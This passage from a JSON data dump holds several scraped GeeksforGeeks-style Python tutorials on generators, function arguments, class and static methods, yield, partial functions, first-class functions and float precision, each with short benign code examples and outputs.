generator()next(call)next(call)next(call)Output :\u00a0First result is  1\nSecond result is  2\nThird result is  3Difference between Generator function and Normal function \u2013\u00a0Once the function yields, the function is paused and the control is transferred to the caller.When the function terminates, StopIteration is raised automatically on further calls.Local variables and their states are remembered between successive calls.The generator function contains one or more yield statements instead of a return statement.As the methods like _next_() and _iter_() are implemented automatically, we can iterate through the items using next().There are various other expressions that can be simply coded similar to list comprehensions but instead of brackets we use parenthesis. These expressions are designed for situations where the generator is used right away by an enclosing function. Generator expression allows creating a generator without a yield keyword. However, it doesn\u2019t share the whole power of the generator created with a yield function. Example :\u00a0\u00a0Python3# Python code to illustrate generator expressiongenerator = (num ** 2 for num in range(10))for num in generator:\u00a0\u00a0\u00a0\u00a0print(num)Output :\u00a00\n1\n4\n9\n16\n25\n36\n49\n64\n81We can also generate a list using generator expressions :\u00a0Python3string = 'geek'li = list(string[i] for i in range(len(string)-1, -1, -1))print(li)Output:\u00a0['k', 'e', 'e', 'g']This article is contributed by Chinmoy Lenka. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "3c2ec5b0d105cf8946e0ebd68a3c4aca",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Python Functions is a block of related statements designed to perform a computational, logical, or evaluative task. The idea is to put some commonly or repeatedly done tasks together and make a function so that instead of writing the same code again and again for different inputs, we can do the function calls to reuse code contained in it over and over again.\u00a0Functions can be both built-in or user-defined. It helps the program to be concise, non-repetitive, and organized.Syntax:\u00a0def function_name(parameters):\n    \"\"\"docstring\"\"\"\n    statement(s)\n    return expressionCreating a FunctionWe can create a \u00a0Python function using the def keyword.Example: Python Creating FunctionPython3# A simple Python function\u00a0def fun():\u00a0\u00a0print(\"Welcome to GFG\")Calling a \u00a0FunctionAfter creating a function we can call it by using the name of the function followed by parenthesis containing parameters of that particular function.Example: Python Calling FunctionPython3# A simple Python function\u00a0def fun():\u00a0\u00a0print(\"Welcome to GFG\")\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Driver code to call a functionfun()OutputWelcome to GFGArguments of a FunctionArguments are the values passed inside the parenthesis of the function. A function can have any number of arguments separated by a comma.Example: Python Function with argumentsIn this example, we will create a simple function to check whether the number passed as an argument to the function is even or odd.Python3# A simple Python function to check# whether x is even or odd\u00a0\u00a0def evenOdd(x):\u00a0\u00a0\u00a0\u00a0if (x % 2 == 0):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"even\")\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"odd\")\u00a0\u00a0# Driver code to call the functionevenOdd(2)evenOdd(3)Outputeven\noddTypes of ArgumentsPython supports various types of arguments that can be passed at the time of the function call. Let\u2019s discuss each type in detail.Default argumentsA default argument is a parameter that assumes a default value if a value is not provided in the function call for that argument. The following example illustrates Default arguments.\u00a0Python3# Python program to demonstrate# default arguments\u00a0\u00a0def myFun(x, y=50):\u00a0\u00a0\u00a0\u00a0print(\"x: \", x)\u00a0\u00a0\u00a0\u00a0print(\"y: \", y)\u00a0\u00a0# Driver code (We call myFun() with only# argument)myFun(10)Output('x: ', 10)\n('y: ', 50)Like C++ default arguments, any number of arguments in a function can have a default value. But once we have a default argument, all the arguments to its right must also have default values.Keyword argumentsThe idea is to allow the caller to specify the argument name with values so that caller does not need to remember the order of parameters.Python3# Python program to demonstrate Keyword Argumentsdef student(firstname, lastname):\u00a0\u00a0\u00a0\u00a0print(firstname, lastname)\u00a0\u00a0# Keyword argumentsstudent(firstname='Geeks', lastname='Practice')student(lastname='Practice', firstname='Geeks')Output('Geeks', 'Practice')\n('Geeks', 'Practice')Variable-length argumentsIn Python, we can pass a variable number of arguments to a function using special symbols. There are two special symbols:*args (Non-Keyword Arguments)**kwargs (Keyword Arguments)Example 1: Variable length non-keywords argumentPython# Python program to illustrate# *args for variable number of arguments\u00a0\u00a0def myFun(*argv):\u00a0\u00a0\u00a0\u00a0for arg in argv:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(arg)\u00a0\u00a0myFun('Hello', 'Welcome', 'to', 'GeeksforGeeks')OutputHello\nWelcome\nto\nGeeksforGeeksExample 2: Variable length keyword argumentsPython3# Python program to illustrate# *kwargs for variable number of keyword arguments\u00a0\u00a0def myFun(**kwargs):\u00a0\u00a0\u00a0\u00a0for key, value in kwargs.items():\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"%s == %s\" % (key, value))\u00a0\u00a0# Driver codemyFun(first='Geeks', mid='for', last='Geeks')Outputfirst == Geeks\nmid == for\nlast == GeeksDocstringThe first string after the function is called the Document string or Docstring in short. This is used to describe the functionality of the function. The use of docstring in functions is optional but it is considered a good practice.The below syntax can be used to print out the docstring of a function:Syntax: print(function_name.__doc__)Example: Adding Docstring to the functionPython3# A simple Python function to check# whether x is even or odd\u00a0\u00a0def evenOdd(x):\u00a0\u00a0\u00a0\u00a0\"\"\"Function to check if the number is even or odd\"\"\"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0if (x % 2 == 0):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"even\")\u00a0\u00a0\u00a0\u00a0else:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(\"odd\")\u00a0\u00a0# Driver code to call the functionprint(evenOdd.__doc__)OutputFunction to check if the number is even or oddThe return statementThe function return statement is used to exit from a function and go back to the function caller and return the specified value or data item to the caller.Syntax: return [expression_list]The return statement can consist of a variable, an expression, or a constant which is returned to the end of the function execution. If none of the above is present with the return statement a None object is returned.Example: Python Function Return StatementPython3def square_value(num):\u00a0\u00a0\u00a0\u00a0\"\"\"This function returns the square\u00a0\u00a0\u00a0\u00a0value of the entered number\"\"\"\u00a0\u00a0\u00a0\u00a0return num**2\u00a0\u00a0print(square_value(2))print(square_value(-4))Output:4\n16Is Python Function Pass by Reference or pass by value?\u00a0One important thing to note is, in Python every variable name is a reference. When we pass a variable to a function, a new reference to the object is created. Parameter passing in Python is the same as reference passing in Java.Example:Python3# Here x is a new reference to same list lstdef myFun(x):\u00a0\u00a0\u00a0\u00a0x[0] = 20\u00a0\u00a0# Driver Code (Note that lst is modified# after function call.lst = [10, 11, 12, 13, 14, 15]myFun(lst)print(lst)Output[20, 11, 12, 13, 14, 15]When we pass a reference and change the received reference to something else, the connection between the passed and received parameter is broken. For example, consider the below program.\u00a0Python3def myFun(x):\u00a0\u00a0\u00a0\u00a0\u00a0# After below line link of x with previous\u00a0\u00a0\u00a0\u00a0# object gets broken. A new object is assigned\u00a0\u00a0\u00a0\u00a0# to x.\u00a0\u00a0\u00a0\u00a0x = [20, 30, 40]\u00a0\u00a0# Driver Code (Note that lst is not modified# after function call.lst = [10, 11, 12, 13, 14, 15]myFun(lst)print(lst)Output[10, 11, 12, 13, 14, 15]Another example to demonstrate that the reference link is broken if we assign a new value (inside the function).\u00a0Python3def myFun(x):\u00a0\u00a0\u00a0\u00a0\u00a0# After below line link of x with previous\u00a0\u00a0\u00a0\u00a0# object gets broken. A new object is assigned\u00a0\u00a0\u00a0\u00a0# to x.\u00a0\u00a0\u00a0\u00a0x = 20\u00a0\u00a0# Driver Code (Note that lst is not modified# after function call.x = 10myFun(x)print(x)Output10Exercise: Try to guess the output of the following code.\u00a0Python3def swap(x, y):\u00a0\u00a0\u00a0\u00a0temp = x\u00a0\u00a0\u00a0\u00a0x = y\u00a0\u00a0\u00a0\u00a0y = temp\u00a0\u00a0# Driver codex = 2y = 3swap(x, y)print(x)print(y)Output2\n3Anonymous functions:\u00a0In Python, an anonymous function means that a function is without a name. As we already know the def keyword is used to define the normal functions and the lambda keyword is used to create anonymous functions. Please see this for details.Python3# Python code to illustrate the cube of a number# using lambda function\u00a0\u00a0def cube(x): return x*x*x\u00a0cube_v2 = lambda x : x*x*x\u00a0print(cube(7))print(cube_v2(7))Output343Python Function within FunctionsA function that is defined inside another function is known as the inner function or nested function. Nested functions are able to access variables of the enclosing scope. Inner functions are used so that they can be protected from everything happening outside the function.Python3# Python program to# demonstrate accessing of# variables of nested functions\u00a0def f1():\u00a0\u00a0\u00a0\u00a0s = 'I love GeeksforGeeks'\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0def f2():\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(s)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0f2()\u00a0# Driver's codef1()OutputI love GeeksforGeeksQuick Links :\u00a0Quiz on Python FunctionsDifference between Method and Function in PythonFirst Class functions in PythonRecent articles on Python Functions.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "3e9dde3dcdab4d51acaff7d0ea6154af",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Class MethodThe @classmethod decorator is a built-in function decorator that is an expression that gets evaluated after your function is defined. The result of that evaluation shadows your function definition.\u00a0A class method receives the class as an implicit first argument, just like an instance method receives the instance\u00a0Syntax:\u00a0class C(object):\n    @classmethod\n    def fun(cls, arg1, arg2, ...):\n       ....\nfun: function that needs to be converted into a class method\nreturns: a class method for function.A class method is a method that is bound to the class and not the object of the class.They have the access to the state of the class as it takes a class parameter that points to the class and not the object instance.It can modify a class state that would apply across all the instances of the class. For example, it can modify a class variable that will be applicable to all the instances.\u00a0Static MethodA static method does not receive an implicit first argument.\u00a0Syntax:\u00a0class C(object):\n    @staticmethod\n    def fun(arg1, arg2, ...):\n        ...\nreturns: a static method for function fun.A static method is also a method that is bound to the class and not the object of the class.A static method can\u2019t access or modify the class state.It is present in a class because it makes sense for the method to be present in class.Class method vs Static MethodA class method takes cls as the first parameter while a static method needs no specific parameters.A class method can access or modify the class state while a static method can\u2019t access or modify it.In general, static methods know nothing about the class state. They are utility-type methods that take some parameters and work upon those parameters. On the other hand class methods must have class as a parameter.We use @classmethod decorator in python to create a class method and we use @staticmethod decorator to create a static method in python.When to use what?We generally use class method to create factory methods. Factory methods return class objects ( similar to a constructor ) for different use cases.We generally use static methods to create utility functions.How to define a class method and a static method?To define a class method in python, we use @classmethod decorator, and to define a static method we use @staticmethod decorator.\u00a0Let us look at an example to understand the difference between both of them. Let us say we want to create a class Person. Now, python doesn\u2019t support method overloading like C++ or Java so we use class methods to create factory methods. In the below example we use a class method to create a person object from birth year.As explained above we use static methods to create utility functions. In the below example we use a static method to check if a person is an adult or not.\u00a0\u00a0Implementation\u00a0Python3# Python program to demonstrate# use of class method and static method.from datetime import date\u00a0\u00a0class Person:\u00a0\u00a0\u00a0\u00a0def __init__(self, name, age):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.name = name\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.age = age\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# a class method to create a Person object by birth year.\u00a0\u00a0\u00a0\u00a0@classmethod\u00a0\u00a0\u00a0\u00a0def fromBirthYear(cls, name, year):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return cls(name, date.today().year - year)\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# a static method to check if a Person is adult or not.\u00a0\u00a0\u00a0\u00a0@staticmethod\u00a0\u00a0\u00a0\u00a0def isAdult(age):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return age > 18\u00a0\u00a0person1 = Person('mayank', 21)person2 = Person.fromBirthYear('mayank', 1996)\u00a0\u00a0print (person1.age)print (person2.age)\u00a0\u00a0# print the resultprint (Person.isAdult(22))Output:21\n25\nTrueThis article is contributed by Mayank Agrawal. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "d7f7c64809cb1646f2fc79d33030d1ca",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "In C/C++ and Java, we can write empty function as following\r\n// An empty function in C/C++/Java\r\nvoid fun() {  }\r\nIn Python, if we write something like following in Python, it would produce compiler error.# Incorrect empty function in Pythondef fun():\u00a0Output :IndentationError: expected an indented blockIn Python, to write empty functions, we use pass statement. pass is a special statement in Python that does nothing. It only works as a dummy statement.# Correct way of writing empty function\u00a0# in Pythondef fun():\u00a0\u00a0\u00a0\u00a0\u00a0passWe can use pass in empty while statement also.# Empty loop in Pythonmutex = Truewhile (mutex == True) :\u00a0\u00a0\u00a0\u00a0passWe can use pass in empty if else statements.# Empty in if/else in Pythonmutex = Trueif (mutex == True) :\u00a0\u00a0\u00a0\u00a0passelse :\u00a0\u00a0\u00a0\u00a0print(\"False\")This article is contributed by Shivam Gupta. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed aboveMy Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "2f2f87119b0ddaea831bdb2f269a0b13",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "The yield statement suspends function\u2019s execution and sends a value back to the caller, but retains enough state to enable function to resume where it is left off. When resumed, the function continues execution immediately after the last yield run. This allows its code to produce a series of values over time, rather than computing them at once and sending them back like a list.Let\u2019s see with an example:# A Simple Python program to demonstrate working# of yield\u00a0\u00a0# A generator function that yields 1 for the first time,# 2 second time and 3 third timedef simpleGeneratorFun():\u00a0\u00a0\u00a0\u00a0yield 1\u00a0\u00a0\u00a0\u00a0yield 2\u00a0\u00a0\u00a0\u00a0yield 3\u00a0\u00a0# Driver code to check above generator functionfor value in simpleGeneratorFun():\u00a0\u00a0\u00a0\u00a0\u00a0print(value)Output:\r\n1\r\n2\r\n3Return sends a specified value back to its caller whereas Yield can produce a sequence of values. We should use yield when we want to iterate over a sequence, but don\u2019t want to store the entire sequence in memory.Yield are used in Python generators. A generator function is defined like a normal function, but whenever it needs to generate a value, it does so with the yield keyword rather than return. If the body of a def contains yield, the function automatically becomes a generator function.# A Python program to generate squares from 1# to 100 using yield and therefore generator\u00a0\u00a0# An infinite generator function that prints# next square number. It starts with 1def nextSquare():\u00a0\u00a0\u00a0\u00a0i = 1\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# An Infinite loop to generate squares\u00a0\u00a0\u00a0\u00a0\u00a0while True:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0yield i*i\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0i += 1\u00a0 # Next execution resumes\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# from this point\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Driver code to test above generator\u00a0# functionfor num in nextSquare():\u00a0\u00a0\u00a0\u00a0if num > 100:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0break\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0print(num)Output:\r\n1\r\n4\r\n9\r\n16\r\n25\r\n36\r\n49\r\n64\r\n81\r\n100This article is contributed by Arpit Agarwal. If you like GeeksforGeeks and would like to contribute, you can also write an article and mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed aboveMy Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "b583e38269714d6977dca95902836e47",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "In Python, we can return multiple values from a function. Following are different ways1) Using Object: This is similar to C/C++ and Java, we can create a class (in C, struct) to hold multiple values and return an object of the class.# A Python program to return multiple\u00a0# values from a method using classclass Test:\u00a0\u00a0\u00a0\u00a0def __init__(self):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.str = \"geeksforgeeks\"\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0self.x = 20\u00a0\u00a0\u00a0\u00a0\u00a0# This function returns an object of Testdef fun():\u00a0\u00a0\u00a0\u00a0return Test()\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# Driver code to test above methodt = fun()\u00a0print(t.str)print(t.x)Output:\r\ngeeksforgeeks\r\n20Below are interesting methods for somebody shifting C++/Java world.\u00a02) Using Tuple: A Tuple is a comma separated sequence of items. It is created with or without (). Tuples are immutable. See this for details of tuple and list.# A Python program to return multiple\u00a0# values from a method using tuple\u00a0\u00a0# This function returns a tupledef fun():\u00a0\u00a0\u00a0\u00a0str = \"geeksforgeeks\"\u00a0\u00a0\u00a0\u00a0x\u00a0\u00a0 = 20\u00a0\u00a0\u00a0\u00a0return str, x;\u00a0 # Return tuple, we could also\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# write (str, x)\u00a0\u00a0# Driver code to test above methodstr, x = fun() # Assign returned tupleprint(str)print(x)Output:\r\ngeeksforgeeks\r\n20\u00a03) Using a list: A list is like an array of items created using square brackets. They are different from arrays as they can contain items of different types. Lists are different from tuples as they are mutable.# A Python program to return multiple\u00a0# values from a method using list\u00a0\u00a0# This function returns a listdef fun():\u00a0\u00a0\u00a0\u00a0str = \"geeksforgeeks\"\u00a0\u00a0\u00a0\u00a0x = 20\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return [str, x];\u00a0\u00a0\u00a0\u00a0# Driver code to test above methodlist = fun()\u00a0print(list)Output:\r\n['geeksforgeeks', 20]\u00a04) Using a Dictionary: A Dictionary is similar to hash or map in other languages. See this for details of dictionary.# A Python program to return multiple\u00a0# values from a method using dictionary\u00a0\u00a0# This function returns a dictionarydef fun():\u00a0\u00a0\u00a0\u00a0d = dict();\u00a0\u00a0\u00a0\u00a0\u00a0d['str'] = \"GeeksforGeeks\"\u00a0\u00a0\u00a0\u00a0d['x']\u00a0\u00a0 = 20\u00a0\u00a0\u00a0\u00a0return d\u00a0\u00a0# Driver code to test above methodd = fun()\u00a0print(d)Output:{'x': 20, 'str': 'GeeksforGeeks'}\u00a05) Using Data Class (Python 3.7+): In Python 3.7 and above the Data Class can be used to return a class with automatically added unique methods. The Data Class module has a decorator and functions for automatically adding generated special methods such as __init__() and __repr__() in the user-defined classes.from dataclasses import dataclass\u00a0\u00a0@dataclassclass Book_list:\u00a0\u00a0\u00a0\u00a0name: str\u00a0\u00a0\u00a0\u00a0perunit_cost: float\u00a0\u00a0\u00a0\u00a0quantity_available: int = 0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0# function to calculate total cost\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0def total_cost(self) -> float:\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return self.perunit_cost * self.quantity_available\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0book = Book_list(\"Introduction to programming.\", 300, 3)x = book.total_cost()\u00a0\u00a0# print the total cost# of the bookprint(x)\u00a0\u00a0# print book detailsprint(book)\u00a0\u00a0# 900Book_list(name='Python programming.',\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0perunit_cost=200,\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0quantity_available=3)Output:900\r\nBook_list(name='Introduction to programming.', perunit_cost=300, quantity_available=3)\r\nBook_list(name='Python programming.', perunit_cost=200, quantity_available=3)Reference:http://stackoverflow.com/questions/354883/how-do-you-return-multiple-values-in-pythonThis article is contributed by Shubham Agrawal. If you like GeeksforGeeks and would like to contribute, you can also write an article and mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed aboveMy Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "701e3a2ec0335987a1eaf2a06b509559",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Partial functions allow us to fix a certain number of arguments of a function and generate a new function.Example:from functools import partial\u00a0\u00a0# A normal functiondef f(a, b, c, x):\u00a0\u00a0\u00a0\u00a0return 1000*a + 100*b + 10*c + x\u00a0\u00a0# A partial function that calls f with# a as 3, b as 1 and c as 4.g = partial(f, 3, 1, 4)\u00a0\u00a0# Calling g()print(g(5))Output:\r\n3145\r\nIn the example we have pre-filled our function with some constant values of a, b and c. And g() just takes a single argument i.e. the variable x.Another Example :from functools import *\u00a0\u00a0# A normal functiondef add(a, b, c):\u00a0\u00a0\u00a0\u00a0return 100 * a + 10 * b + c\u00a0\u00a0# A partial function with b = 1 and c = 2add_part = partial(add, c = 2, b = 1)\u00a0\u00a0# Calling partial functionprint(add_part(3))Output:\r\n312\r\nPartial functions can be used to derive specialized functions from general functions and therefore help us to reuse our code.This feature is similar to bind in C++.This article is contributed by Mayank Rawat .If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "328f93927d4fa52d20ab30820f11bffc",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "First class objects in a language are handled uniformly throughout. They may be stored in data structures, passed as arguments, or used in control structures. A programming language is said to support first-class functions if it treats functions as first-class objects. Python supports the concept of First Class functions.Properties of first class functions:A function is an instance of the Object type.You can store the function in a variable.You can pass the function as a parameter to another function.You can return the function from a function.You can store them in data structures such as hash tables, lists, \u2026Examples illustrating First Class functions in Python1. Functions are objects: Python functions are first class objects. In the example below, we are assigning function to a variable. This assignment doesn\u2019t call the function. It takes the function object referenced by shout and creates a second name pointing to it, yell.# Python program to illustrate functions# can be treated as objectsdef shout(text):\u00a0\u00a0\u00a0\u00a0return text.upper()\u00a0\u00a0print (shout('Hello'))\u00a0\u00a0yell = shout\u00a0\u00a0print (yell('Hello'))Output:\r\nHELLO\r\nHELLO\r\n2. Functions can be passed as arguments to other functions: Because functions are objects we can pass them as arguments to other functions. Functions that can accept other functions as arguments are also called higher-order functions. In the example below, we have created a function greet which takes a function as an argument.# Python program to illustrate functions# can be passed as arguments to other functionsdef shout(text):\u00a0\u00a0\u00a0\u00a0return text.upper()\u00a0\u00a0def whisper(text):\u00a0\u00a0\u00a0\u00a0return text.lower()\u00a0\u00a0def greet(func):\u00a0\u00a0\u00a0\u00a0# storing the function in a variable\u00a0\u00a0\u00a0\u00a0greeting = func(\"\"\"Hi, I am created by a function\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0passed as an argument.\"\"\")\u00a0\u00a0\u00a0\u00a0print (greeting)\u00a0\u00a0\u00a0greet(shout)greet(whisper)Output\r\nHI, I AM CREATED BY A FUNCTION PASSED AS AN ARGUMENT.\r\nhi, i am created by a function passed as an argument.\r\n3. Functions can return another function: Because functions are objects we can return a function from another function. In the below example, the create_adder function returns adder function.# Python program to illustrate functions# Functions can return another function\u00a0\u00a0def create_adder(x):\u00a0\u00a0\u00a0\u00a0def adder(y):\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return x+y\u00a0\u00a0\u00a0\u00a0\u00a0\u00a0return adder\u00a0\u00a0add_15 = create_adder(15)\u00a0\u00a0print (add_15(10))Output:\r\n25\r\nThis article is contributed by Mayank Agrawal. If you like GeeksforGeeks and would like to contribute, you can also write an article using contribute.geeksforgeeks.org or mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "355d8cef4777b3694ff36802d0a2fe18",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
    "text": "Python in its definition allows handling the precision of floating-point numbers in several ways using different functions. Most of them are defined under the \u201cmath\u201d module. Some of the most used operations are discussed in this article.trunc():- This function is used to eliminate all decimal parts of the floating-point number and return the integer without the decimal part.\u00a0ceil():- This function is used to print the least integer greater than the given number.floor():- This function is used to print the greatest integer smaller than the given integer.\u00a0Python3# Python code to demonstrate ceil(), trunc()# and floor()\u00a0# importing \"math\" for precision functionimport math\u00a0# initializing valuea = 3.4536\u00a0# using trunc() to print integer after truncatingprint(\"The integral value of number is : \", end=\"\")print(math.trunc(a))\u00a0# using ceil() to print number after ceilingprint(\"The smallest integer greater than number is : \", end=\"\")print(math.ceil(a))\u00a0# using floor() to print number after flooringprint(\"The greatest integer smaller than number is : \", end=\"\")print(math.floor(a))Output :\u00a0\u00a0The integral value of number is : 3\nThe smallest integer greater than number is : 4\nThe greatest integer smaller than number is : 3\u00a0Setting PrecisionThere are many ways to set the precision of the floating-point values. Some of them are discussed below.Using \u201c%\u201d:- \u201c%\u201d operator is used to format as well as set precision in python. This is similar to \u201cprintf\u201d statement in C programming.\u00a0Using format():- This is yet another way to format the string for setting precision.\u00a0Using round(x,n):- This function takes 2 arguments, number, and the number till which we want decimal part rounded.\u00a0Python3# Python code to demonstrate precision# and round()\u00a0# initializing valuea = 3.4536\u00a0# using \"%\" to print value till 2 decimal placesprint (\"The value of number till 2 decimal place(using %) is : \",end=\"\")print ('%.2f'%a)\u00a0# using format() to print value till 2 decimal placesprint (\"The value of number till 2 decimal place(using format()) is : \",end=\"\")print (\"{0:.2f}\".format(a))\u00a0# using round() to print value till 2 decimal placesprint (\"The value of number till 2 decimal place(using round()) is : \",end=\"\")print (round(a,2))Output :\u00a0The value of number till 2 decimal place(using %) is : 3.45\nThe value of number till 2 decimal place(using format()) is : 3.45\nThe value of number till 2 decimal place(using round()) is : 3.45This article is contributed by Manjeet Singh. If you like GeeksforGeeks and would like to contribute, you can also write an article using write.geeksforgeeks.org or mail your article to review-team@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks.Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above.\u00a0My Personal Notes\narrow_drop_upSave",
    "weight": null,
    "uri": null,
    "tags": null,
    "offset": null,
    "location": null,
    "embedding": null,
    "modality": null,
    "evaluations": null,
    "scores": null,
    "chunks": null,
    "matches": null
  },
  {
    "id": "ca149991d4a9309b1c968862f7455e8d",
    "parent_id": null,
    "granularity": null,
    "adjacency": null,
    "blob": null,
    "tensor": null,
    "mime_type": null,
